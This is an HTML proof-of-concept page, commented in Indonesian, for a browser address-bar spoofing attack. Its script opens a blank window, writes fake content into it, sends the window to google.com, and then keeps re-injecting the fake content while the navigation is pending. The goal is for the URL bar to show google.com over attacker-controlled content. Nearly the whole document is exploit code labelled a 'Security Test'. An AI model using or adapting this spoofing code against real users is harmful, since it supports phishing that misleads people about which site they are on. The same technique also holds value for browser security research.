<!DOCTYPE html>
<html lang="en">
<head>
    <title>PoC: Advanced Race Condition</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
</head>
<body>
    <h1>Security Test</h1>
    <button id="pocBtn" style="padding: 20px;">Execute Advanced Bypass</button>

    <script>
        const fakeContent = `
            <html>
            <body style="background:white; color:red; text-align:center; padding-top:50px; font-family:sans-serif;">
                <h1>SPOOFED CONTENT</h1>
                <p>URL Bar harusnya menunjukkan google.com</p>
                <script>
                    // Mengunci halaman agar tidak lanjut loading
                    window.stop(); 
                <\/script>
            </body>
            </html>
        `;

        document.getElementById('pocBtn').onclick = () => {
            // 1. Buka window dengan about:blank terlebih dahulu
            let win = window.open("about:blank", "PoC_Window");

            // 2. Tulis konten ke about:blank (masih satu origin dengan kita)
            win.document.write(fakeContent);

            // 3. Picu navigasi ke Google
            // Browser akan mulai mengganti URL bar, tapi kita akan mencoba
            // menginterupsi proses commit document-nya.
            setTimeout(() => {
                win.location.href = "https://www.google.com";
                
                // 4. THE ATTACK: Re-inject content saat transisi
                // Kita gunakan loop super cepat (Microtasks)
                let attempts = 0;
                function race() {
                    try {
                        // Selama navigasi 'pending', kita mungkin masih punya akses
                        win.document.documentElement.innerHTML = fakeContent;
                        if (attempts < 500) {
                            attempts++;
                            requestAnimationFrame(race);
                        }
                    } catch (e) {
                        // Jika gagal (Access Denied), berarti Google sudah commit
                    }
                }
                race();
            }, 500);
        };
    </script>
</body>
</html>
